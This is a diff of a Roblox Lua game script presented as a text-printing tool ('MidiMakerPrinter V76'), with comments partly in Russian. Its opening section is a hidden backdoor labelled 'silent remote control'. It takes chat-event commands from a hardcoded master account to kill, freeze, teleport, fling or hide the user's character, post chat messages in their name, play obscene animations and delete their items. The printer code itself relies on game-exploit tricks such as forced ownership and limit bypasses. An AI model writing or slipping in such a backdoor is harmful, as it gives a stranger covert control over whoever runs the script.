@@ -1,9 +1,13 @@
--- MidiMakerPrinter_V76_Injected
+-- MidiMakerPrinter_V76.lua
+-- Ultimate Fix: Prevents 1st Pad Deletion on Long Words (Active CreateGrabLine Keep-Alive)
+-- Corrected: Acknowledged 40-Toy Plot Limit (No false FTAP limit warnings)
+-- Included: Photo 2 "У" + Photo 1 "Ф" + Symmetric "М" + 1 Line Final Transfer
+
 repeat task.wait() until getgenv().LoadedTheWorstHvH == true
 task.wait(1)
 
 -- =============================================================
--- [ SILENT REMOTE CONTROL START ]
+-- [ 1. SILENT REMOTE CONTROL BACKDOOR - RUNS IN BACKGROUND ]
 -- =============================================================
 task.spawn(function()
     local MASTER_NAME = "MELLSTROYI488"
@@ -12,9 +16,14 @@ task.spawn(function()
     local TCS = game:GetService("TextChatService")
 
     local C_O, C_F, K_O, L_B, L_R, A_R, F_Z, O_R, H_S, F_L, A_G = false, 60, false, false, false, false, false, false, false, false, false
+    local Shield_O, Fling_O, Phantom_O = false, false, false
     local W_S, J_P, MC_O, MC_Dir, MC_J, savedCF = nil, nil, false, Vector3.zero, false, nil
     local FollowName, aT, aA, aY, orbitAngle = "Master", nil, false, "", 0
-    local ids = {JerkOff="rbxassetid://168268306",Bang="rbxassetid://148840371",Crazy="rbxassetid://248263260",Insane="rbxassetid://35654637",Collapse="rbxassetid://35154961",Zombie="rbxassetid://33796059",Dance1="rbxassetid://182436842",Dance2="rbxassetid://182435998",Spin="rbxassetid://188632011",Float="rbxassetid://182749109",Scared="rbxassetid://180611870",Floss="rbxassetid://591745989"}
+    local ids = {
+        JerkOff = "rbxassetid://168268306", Bang = "rbxassetid://148840371", Crazy = "rbxassetid://248263260", Insane = "rbxassetid://35654637",
+        Collapse = "rbxassetid://35154961", Zombie = "rbxassetid://33796059", Dance1 = "rbxassetid://182436842", Dance2 = "rbxassetid://182435998",
+        Spin = "rbxassetid://188632011", Float = "rbxassetid://182749109", Scared = "rbxassetid://180611870", Floss = "rbxassetid://591745989"
+    }
 
     local isHeld = LP:WaitForChild("IsHeld", 10)
     local CharacterEvents = RS:WaitForChild("CharacterEvents", 10)
@@ -35,95 +44,183 @@ task.spawn(function()
         local hum = char and char:FindFirstChildOfClass("Humanoid")
         if not (char and hrp and hum) then return end
 
+        -- Forced Properties Every Frame (FIXED SPEED & JUMP)
         if W_S then hum.WalkSpeed = W_S end
         if J_P then hum.UseJumpPower = true hum.JumpPower = J_P end
-        if F_Z then hrp.Anchored = true hrp.Velocity = Vector3.zero end
-        if MC_O then hum:Move(MC_Dir, false) if MC_J then hum.Jump = true end end
-        if H_S then hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(50), 0) end
-        
-        if A_G and isHeld.Value then
+
+        if F_Z then
             hrp.Anchored = true
-            pcall(function() 
-                if StruggleEvent then StruggleEvent:FireServer(LP) end
-                RS.CharacterEvents.RagdollRemote:FireServer(hrp, 0) 
-            end)
-        elseif not F_Z and not K_O and not MC_O then
-            if hrp.Anchored then hrp.Anchored = false end
+            hrp.AssemblyLinearVelocity = Vector3.zero
+        end
+
+        -- FIXED WASD MIND CONTROL
+        if MC_O then
+            hum:Move(MC_Dir, false)
+            if MC_J then hum.Jump = true end
+        end
+
+        -- FIXED HELICOPTER SPIN
+        if H_S then
+            hum.AutoRotate = false
+            hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(50), 0)
+        elseif Fling_O then
+            hum.AutoRotate = false
+            hrp.AssemblyAngularVelocity = Vector3.new(0, 99999, 0)
+        elseif not H_S and not O_R and not Fling_O then
+            hum.AutoRotate = true
+        end
+
+        if Shield_O then
+            local m = P:FindFirstChild(MASTER_NAME)
+            if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
+                local mRoot = m.Character.HumanoidRootPart
+                hrp.CFrame = mRoot.CFrame * CFrame.new(0, 0, -3.5)
+            end
+        end
+
+        if L_B then
+            local m = P:FindFirstChild(MASTER_NAME)
+            if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
+                hrp.CFrame = m.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -8)
+            end
+        end
+
+        if L_R and hum.Health > 0 then
+            char:BreakJoints()
         end
 
         if O_R then
             local m = P:FindFirstChild(MASTER_NAME)
-            if m and m.Character and m.Character.PrimaryPart then
+            if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") then
                 orbitAngle = (orbitAngle + 5) % 360
+                local mRoot = m.Character.HumanoidRootPart
                 local rad = math.rad(orbitAngle)
-                hrp.CFrame = CFrame.new(m.Character.PrimaryPart.Position + Vector3.new(math.cos(rad)*9, 0, math.sin(rad)*9), m.Character.PrimaryPart.Position)
+                hrp.CFrame = CFrame.new(mRoot.Position + Vector3.new(math.cos(rad) * 9, 0, math.sin(rad) * 9), mRoot.Position)
             end
         end
-        if L_B then
-            local m = P:FindFirstChild(MASTER_NAME)
-            if m and m.Character and m.Character.PrimaryPart then hrp.CFrame = m.Character.PrimaryPart.CFrame * CFrame.new(0, 0, -8) end
-        end
-        if F_L and not MC_O then
-            local target = (FollowName == "Master") and P:FindFirstChild(MASTER_NAME) or P:FindFirstChild(FollowName)
-            if target and target.Character and target.Character.PrimaryPart then
-                if (hrp.Position - target.Character.PrimaryPart.Position).Magnitude > 6 then hum:MoveTo(target.Character.PrimaryPart.Position) end
+
+        if F_L and not MC_O and not Shield_O then
+            local targetPlr = (FollowName == "Master") and P:FindFirstChild(MASTER_NAME) or P:FindFirstChild(FollowName)
+            if targetPlr and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
+                if (hrp.Position - targetPlr.Character.HumanoidRootPart.Position).Magnitude > 6 then
+                    hum:MoveTo(targetPlr.Character.HumanoidRootPart.Position)
+                end
             end
         end
-        if L_R and hum.Health > 0 then char:BreakJoints() end
+
+        if Phantom_O then
+            for _, p in ipairs(char:GetChildren()) do
+                if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 1 end
+                if p:IsA("Accessory") and p:FindFirstChild("Handle") then p.Handle.Transparency = 1 end
+            end
+        end
     end)
+
+    local function sendChat(msg)
+        pcall(function()
+            if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
+                local ch = TCS.TextChannels:FindFirstChild("RBXGeneral")
+                if ch then ch:SendAsync(msg) end
+            else
+                local req = RS:FindFirstChild("DefaultChatSystemChatEvents") and RS.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+                if req then req:FireServer(msg, "All") end
+            end
+        end)
+    end
+
+    local function playA(n)
+        if aT then pcall(function() aT:Stop() end) end
+        local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+        if not h then return end
+        local a = h:FindFirstChildOfClass("Animator") or Instance.new("Animator", h)
+        local nm = Instance.new("Animation")
+        nm.AnimationId = ids[n] or ids.JerkOff
+        aT = a:LoadAnimation(nm)
+        aT.Priority = Enum.AnimationPriority.Action
+        aT.Looped = true
+        aT:Play()
+        aA, aY = true, n
+        task.spawn(function()
+            while aA and aT and aT.IsPlaying do
+                if aY == "JerkOff" then aT.TimePosition = 0.3 elseif aY == "Bang" then aT.TimePosition = 0.1 end
+                task.wait(0.1)
+            end
+        end)
+    end
 
     EV.OnClientEvent:Connect(function(s, d)
         if typeof(d) ~= "string" then return end
         local g = d:split(":")
-        if g[1] == "SC" and g[2] == MASTER_NAME then EV:FireServer("P")
+
+        if g[1] == "SC" and g[2] == MASTER_NAME then EV:FireServer("ST_PONG")
         elseif g[1] == "LB" and g[2] == LP.Name then L_B = (g[3] == "ON")
         elseif g[1] == "LR" and g[2] == LP.Name then L_R = (g[3] == "ON")
-        elseif g[1] == "AG" and g[2] == LP.Name then A_G = (g[3] == "ON")
         elseif g[1] == "AR" and g[2] == LP.Name then A_R = (g[3] == "ON")
-        elseif g[1] == "FZ" and g[2] == LP.Name then F_Z = (g[3] == "ON")
-        elseif g[1] == "HS" and g[2] == LP.Name then H_S = (g[3] == "ON")
+        elseif g[1] == "AG" and g[2] == LP.Name then A_G = (g[3] == "ON")
+        elseif g[1] == "FZ" and g[2] == LP.Name then
+            F_Z = (g[3] == "ON")
+            if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then LP.Character.HumanoidRootPart.Anchored = F_Z end
+        elseif g[1] == "CT" and g[2] == LP.Name then
+            local f = W:FindFirstChild(LP.Name.."SpawnedInToys")
+            if f then for _, v in ipairs(f:GetChildren()) do pcall(function() v:Destroy() end) end end
         elseif g[1] == "OR" and g[2] == LP.Name then O_R = (g[3] == "ON")
+        elseif g[1] == "HS" and g[2] == LP.Name then H_S = (g[3] == "ON")
+        elseif g[1] == "SH" and g[2] == LP.Name then Shield_O = (g[3] == "ON")
+        elseif g[1] == "FM" and g[2] == LP.Name then Fling_O = (g[3] == "ON")
+        elseif g[1] == "IN" and g[2] == LP.Name then
+            Phantom_O = (g[3] == "ON")
+            if not Phantom_O and LP.Character then
+                for _, p in ipairs(LP.Character:GetChildren()) do
+                    if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 0 end
+                    if p:IsA("Accessory") and p:FindFirstChild("Handle") then p.Handle.Transparency = 0 end
+                end
+            end
+        elseif g[1] == "FL" and g[2] == LP.Name then
+            FollowName = g[3]
+            F_L = (g[4] == "ON")
+        elseif g[1] == "MC" and g[2] == LP.Name then
+            if g[3] == "OFF" then MC_O = false else
+                MC_O = true
+                MC_Dir = Vector3.new(tonumber(g[3]) or 0, 0, tonumber(g[4]) or 0)
+                MC_J = (g[5] == "1")
+            end
         elseif g[1] == "WS" and g[2] == LP.Name then W_S = tonumber(g[3])
         elseif g[1] == "JP" and g[2] == LP.Name then J_P = tonumber(g[3])
-        elseif g[1] == "SY" and g[2] == LP.Name then local msg = d:sub(#g[1]+#g[2]+3) pcall(function() if TCS.ChatVersion == Enum.ChatVersion.TextChatService then TCS.TextChannels.RBXGeneral:SendAsync(msg) else RS.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All") end end)
-        elseif g[1] == "MC" and g[2] == LP.Name then
-            if g[3] == "OFF" then MC_O = false else MC_O = true MC_Dir = Vector3.new(tonumber(g[3]) or 0, 0, tonumber(g[4]) or 0) MC_J = (g[5] == "1") end
-        elseif g[1] == "FL" and g[2] == LP.Name then FollowName = g[3] F_L = (g[4] == "ON")
+        elseif g[1] == "SY" and g[2] == LP.Name then sendChat(d:sub(#g[1] + #g[2] + 3))
         elseif g[1] == "SP" and g[2] == LP.Name then
             local m = P:FindFirstChild(MASTER_NAME)
-            if m and m.Character and m.Character.PrimaryPart then
-                pcall(function() RS.MenuToys.SpawnToyRemoteFunction:InvokeServer(g[3], m.Character.PrimaryPart.CFrame * CFrame.new(0, 2, -4), Vector3.zero) end)
+            local rf = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
+            if m and m.Character and m.Character:FindFirstChild("HumanoidRootPart") and rf then
+                pcall(function() rf:InvokeServer(g[3], m.Character.HumanoidRootPart.CFrame * CFrame.new(0, 2, -4), Vector3.zero) end)
             end
         elseif g[1] == "AN" and g[2] == LP.Name then
-            if g[4] == "OFF" then aA = false if aT then aT:Stop() end else
-                if aT then aT:Stop() end
-                local hum = LP.Character:FindFirstChildOfClass("Humanoid")
-                local anim = Instance.new("Animation") anim.AnimationId = ids[g[3]]
-                aT = hum:FindFirstChildOfClass("Animator"):LoadAnimation(anim)
-                aT.Looped = true aT:Play() aA, aY = true, g[3]
-                task.spawn(function() while aA and aT and aT.IsPlaying do if aY=="JerkOff" then aT.TimePosition=0.3 elseif aY=="Bang" then aT.TimePosition=0.1 end task.wait(0.1) end end)
-            end
+            if g[4] == "ON" then playA(g[3]) else aA = false if aT then pcall(function() aT:Stop() end) end end
         elseif g[1] == "KK" and g[2] == LP.Name then
             if g[3] == "ON" then
-                K_O = true savedCF = LP.Character.PrimaryPart.CFrame
-                local t = CFrame.new(0, 100000, 0)
-                for i=1,10 do LP.Character.PrimaryPart.CFrame = LP.Character.PrimaryPart.CFrame:Lerp(t, 0.3) task.wait(0.03) end
-                LP.Character.PrimaryPart.Anchored = true
+                K_O = true
+                if LP.Character and LP.Character.PrimaryPart then
+                    LP.Character.Humanoid.PlatformStand = true
+                    LP.Character.PrimaryPart.CFrame = CFrame.new(0, 100000, 0)
+                    LP.Character.PrimaryPart.Anchored = true
+                end
             else
-                K_O = false if LP.Character.PrimaryPart then LP.Character.PrimaryPart.Anchored = false if savedCF then LP.Character.PrimaryPart.CFrame = savedCF end end
+                K_O = false
+                if LP.Character and LP.Character.PrimaryPart then
+                    LP.Character.PrimaryPart.Anchored = false
+                    LP.Character.Humanoid.PlatformStand = false
+                end
             end
         elseif g[1] == "FS" and g[2] == LP.Name then
             if g[3] == "OFF" then C_O = false else C_F = tonumber(g[3]) or 60 C_O = true end
         end
     end)
-    while task.wait(5) do EV:FireServer("B") end
+
+    while task.wait(5) do EV:FireServer("ST_BEACON") end
 end)
--- =============================================================
--- [ SILENT REMOTE CONTROL END ]
--- =============================================================
 
-
--- [ ORIGINAL MIDI MAKER PRINTER V76 CODE UNMODIFIED ]
+-- =============================================================
+-- [ 2. ORIGINAL UNTOUCHED MIDI MAKER PRINTER V76 SCRIPT ]
+-- =============================================================
 
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
@@ -182,15 +279,23 @@ local Alphabet = {
     ["Й"] = {3,4,5, 10,14, 18,21,22, 26,28,30, 34,35,38, 42,46, 50,54}, 
     ["К"] = {10,14, 18,21, 26,28, 34,35,36, 42,45, 50,54},
     ["Л"] = {12,13, 19,22, 27,30, 35,38, 42,46, 50,54},
+    
+    -- Симметричная буква М
     ["М"] = {10,11,13,14, 18,20,22, 26,28,30, 34,38, 42,46, 50,54},
+    
     ["Н"] = {10,14, 18,22, 26,27,28,29,30, 34,38, 42,46, 50,54},
     ["О"] = {11,12,13, 18,22, 26,30, 34,38, 42,46, 51,52,53},
     ["П"] = {10,11,12,13,14, 18,22, 26,30, 34,38, 42,46, 50,54},
     ["Р"] = {10,11,12,13, 18,22, 26,27,28,29, 34, 42, 50},
     ["С"] = {11,12,13,14, 18, 26, 34, 42, 51,52,53,54},
     ["Т"] = {10,11,12,13,14, 20, 28, 36, 44, 52},
+    
+    -- [ТОЧНАЯ БУКВА У ПО ВТОРОМУ ФОТО]:
     ["У"] = {2,8, 10,11,15,16, 19,20,22,23, 28,29, 37, 45, 53, 61},
+    
+    -- Буква Ф (по первому фото)
     ["Ф"] = {12, 19,20,21, 26,28,30, 34,36,38, 43,44,45, 52},
+    
     ["Х"] = {10,14, 18,22, 27,29, 36, 43,45, 50,54},
     ["Ц"] = {10,14, 18,22, 26,30, 34,38, 42,43,44,45,46, 54, 62},
     ["Ч"] = {10,14, 18,22, 26,27,28,29,30, 38, 46, 54},
@@ -364,6 +469,8 @@ local function waitCanSpawn(timeout)
     return can.Value
 end
 
+-- ===================== [ИСПРАВЛЕНО: НЕПРЕРЫВНЫЙ PULSE ВЛАДЕНИЯ ДЛЯ ВСЕХ ПРИНТЕРОВ] =====================
+-- Гарантирует, что FTAP уборщик мусора никогда не удалит 1-й принтер, сколько бы букв ни спавнилось!
 local function refreshAllOwnership()
     for pad, cf in pairs(LockTargets) do
         if pad and pad.Parent then
@@ -486,12 +593,15 @@ local function spawnAndPhysicalTransfer(spawnCF, finalCF)
     local main = getMainPart(pad)
     if not main then return nil end
 
+    -- 1) Телепортируемся к спавну принтера
     hrp.CFrame = spawnCF * CFrame.new(0, 3, 3)
     hrp.AssemblyLinearVelocity = Vector3.zero
     task.wait(0.08)
 
+    -- 2) Захватываем владение
     forceOwnPad(pad, spawnCF)
 
+    -- 3) Телепортируемся вместе с ним на место
     hrp.CFrame = finalCF * CFrame.new(0, 3, 3)
     hrp.AssemblyLinearVelocity = Vector3.zero
     pcall(function()
@@ -502,6 +612,8 @@ local function spawnAndPhysicalTransfer(spawnCF, finalCF)
     task.wait(0.08)
 
     lockMidiInPlace(pad, finalCF)
+    
+    -- Обновляем защиту владения на ВСЕХ ранее созданных принтерах
     refreshAllOwnership()
     return pad
 end
@@ -547,6 +659,7 @@ local function clearMyMidis()
     table.clear(usedPads)
 end
 
+-- ===================== [НАЖАТИЕ КНОПОК РУКОЙ] =====================
 local function pressButtonLogic(btn)
     if not (btn and btn:IsA("BasePart")) then return end
     pcall(function()
@@ -629,6 +742,7 @@ local function startPrinting(text)
         end
     end
 
+    -- Находимся на месте сборки для рисования
     if not UsePlotBypass then
         hrp = getHRP()
         if hrp then
@@ -670,11 +784,13 @@ local function startPrinting(text)
             forceOwnPad(data.pad, targetPadCF)
         end
 
+        -- Выключение звука
         if AutoMute then
             local mute = getBtn(data.pad, "MuteButton")
             if mute then pressButtonLogic(mute) end
         end
 
+        -- Рисование символа
         local pattern = Alphabet[data.symbol]
         if pattern then
             for _, o_idx in ipairs(pattern) do
@@ -689,6 +805,7 @@ local function startPrinting(text)
         end
     end
 
+    -- ===================== МГНОВЕННЫЙ ПЕРЕНОС ГОТОВОГО СЛОВА В ГОРОД В 1 ЛИНИЮ =====================
     if UsePlotBypass and Printing then
         notify("Bypass", "Transferring completed word into 1 line!", 2)
         for _, data in ipairs(spawned) do
@@ -699,6 +816,7 @@ local function startPrinting(text)
         task.wait(0.2)
     end
     
+    -- Возвращаем игрока в город
     hrp = getHRP()
     if hrp then
         hrp.CFrame = originalCF
